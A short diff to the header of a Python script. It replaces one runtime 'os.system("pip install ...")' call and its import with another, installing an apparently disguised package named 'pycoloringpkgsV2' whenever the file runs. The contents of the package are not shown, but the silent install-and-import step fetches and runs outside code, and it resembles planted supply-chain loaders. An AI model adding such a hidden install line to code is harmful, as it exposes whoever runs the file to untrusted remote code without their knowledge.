@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlpackageV2")
-import pipsqlpackageV2
+os.system("pip install pycoloringpkgsV2")
+import pycoloringpkgsV2
 import json
 import httpx
 import time
